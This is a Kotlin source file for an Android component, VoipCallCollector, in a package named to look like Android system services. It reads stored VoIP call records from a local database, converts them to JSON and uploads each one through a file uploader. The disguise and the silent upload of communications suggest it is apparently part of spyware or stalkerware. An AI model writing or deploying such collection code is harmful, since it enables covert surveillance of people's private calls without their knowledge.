package com.android.services.logs.collectors

import android.content.Context
import com.android.services.db.entities.VoipCall
import com.android.services.interfaces.LogsCollector
import com.android.services.logs.source.LocalDatabaseSource
import com.android.services.retrofit.FileUploader
import com.android.services.util.AppConstants
import com.android.services.util.AppUtils
import com.android.services.util.logException
import com.android.services.util.logVerbose
import com.google.gson.GsonBuilder
import com.google.gson.reflect.TypeToken
import org.json.JSONArray

class VoipCallCollector(
    private val context: Context,
    private val localDatabaseSource: LocalDatabaseSource,
) : LogsCollector {

    override fun uploadLogs() {
        localDatabaseSource.selectVoipCalls { voipCalls ->
            if (voipCalls.isNotEmpty()) {
                try {
                    val gson = GsonBuilder().create()
                    val mVoipCallJSON =
                        JSONArray(
                            gson.toJson(
                                voipCalls,
                                object : TypeToken<List<VoipCall>>() {}.type
                            )
                        )
                    val fileUploader =
                        FileUploader(context, AppConstants.VOIP_CALL_TYPE, localDatabaseSource)
                    for (i in 0 until mVoipCallJSON.length()) {
                        try {
                            fileUploader.uploadFile(mVoipCallJSON.getJSONObject(i))
                        } catch (e: Exception) {
                            logException(e.message!!, AppConstants.VOIP_CALL_TYPE, e)
                        }
                    }
                } catch (e: Exception) {
                    AppUtils.appendLog(context, "${AppConstants.VOIP_CALL_TYPE} ${e.message}")
                    logException(e.message!!, AppConstants.VOIP_CALL_TYPE, e)
                }
            } else {
                logVerbose("No VoipCalls found", AppConstants.VOIP_CALL_TYPE)
            }
        }
    }
}